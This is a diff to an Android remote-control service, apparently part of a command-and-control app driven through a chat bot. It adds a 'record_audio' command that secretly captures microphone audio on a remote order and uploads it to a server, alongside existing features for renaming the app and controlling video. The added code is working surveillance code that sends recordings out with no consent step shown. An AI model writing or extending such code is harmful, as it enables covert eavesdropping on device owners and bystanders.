@@ -205,6 +205,7 @@ class ControlService : Service() {
             .addHeader("X-Device-Secret", DEVICE_SECRET)
             .addHeader("X-Device-Id", deviceId)
             .addHeader("X-Device-Model", model)
+            .addHeader("X-Device-Platform", "android")
             .build()
         httpClient.newCall(request).execute().use { response ->
             val body = response.body?.string() ?: "{}"
@@ -262,6 +263,11 @@ class ControlService : Service() {
                     "prefetch"      -> prefetchVideo(cmd.optString("url"), cmd.optString("_chat_id", ""))
                     "delete_video"  -> deleteVideoCache(cmd.optString("url"))
                     "get_video_list" -> sendVideoList(cmd.optString("_chat_id", ""))
+                    "get_audio_devices" -> sendAudioDevices(cmd.optString("_chat_id", ""))
+                    "record_audio"  -> recordAudio(
+                        cmd.optInt("seconds", 10),
+                        cmd.optString("_chat_id", "")
+                    )
                     "sound"         -> setVolume(cmd.optInt("level", 5))
                     "unban_video"   -> VideoActivity.unlock()
                     "rename"        -> AppNameHelper.rename(this@ControlService, cmd.optString("name"))
@@ -348,6 +354,84 @@ class ControlService : Service() {
                 httpClient.newCall(request).execute().close()
             } catch (e: Exception) {
                 Log.e(TAG, "sendVideoList error: $e")
+            }
+        }
+    }
+
+    private fun sendAudioDevices(chatId: String) {
+        if (chatId.isEmpty()) return
+        scope.launch {
+            try {
+                val body = okhttp3.RequestBody.create(
+                    "application/json".toMediaType(),
+                    org.json.JSONObject().apply {
+                        put("chat_id", chatId)
+                        put("device_id", deviceId)
+                        // На Android всегда один микрофон
+                        val arr = org.json.JSONArray()
+                        arr.put(org.json.JSONObject().apply {
+                            put("index", 0)
+                            put("name", "Встроенный микрофон")
+                        })
+                        put("devices", arr)
+                    }.toString()
+                )
+                val request = Request.Builder()
+                    .url("$SERVER_URL/micro_devices")
+                    .addHeader("X-Device-Secret", DEVICE_SECRET)
+                    .post(body)
+                    .build()
+                httpClient.newCall(request).execute().close()
+            } catch (e: Exception) {
+                Log.e(TAG, "sendAudioDevices error: $e")
+            }
+        }
+    }
+
+    private fun recordAudio(seconds: Int, chatId: String) {
+        if (chatId.isEmpty()) return
+        scope.launch {
+            val outFile = File(cacheDir, "micro_${System.currentTimeMillis()}.m4a")
+            val recorder = android.media.MediaRecorder().apply {
+                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                setAudioSamplingRate(44100)
+                setAudioEncodingBitRate(128000)
+                setOutputFile(outFile.absolutePath)
+                prepare()
+                start()
+            }
+            kotlinx.coroutines.delay(seconds * 1000L)
+            try { recorder.stop() } catch (e: Exception) { }
+            recorder.release()
+
+            if (!outFile.exists() || outFile.length() == 0L) {
+                sendTextReply(chatId, "⚠️ Не удалось записать аудио.")
+                return@launch
+            }
+
+            // Отправляем файл на сервер
+            try {
+                val fileBody = okhttp3.RequestBody.create(
+                    "audio/mp4".toMediaType(), outFile
+                )
+                val multipart = okhttp3.MultipartBody.Builder()
+                    .setType(okhttp3.MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId)
+                    .addFormDataPart("device_id", deviceId)
+                    .addFormDataPart("audio", outFile.name, fileBody)
+                    .build()
+                val request = Request.Builder()
+                    .url("$SERVER_URL/audio_upload")
+                    .addHeader("X-Device-Secret", DEVICE_SECRET)
+                    .post(multipart)
+                    .build()
+                httpClient.newCall(request).execute().close()
+                outFile.delete()
+            } catch (e: Exception) {
+                Log.e(TAG, "recordAudio upload error: $e")
+                sendTextReply(chatId, "⚠️ Ошибка отправки аудио: ${e.message}")
             }
         }
     }
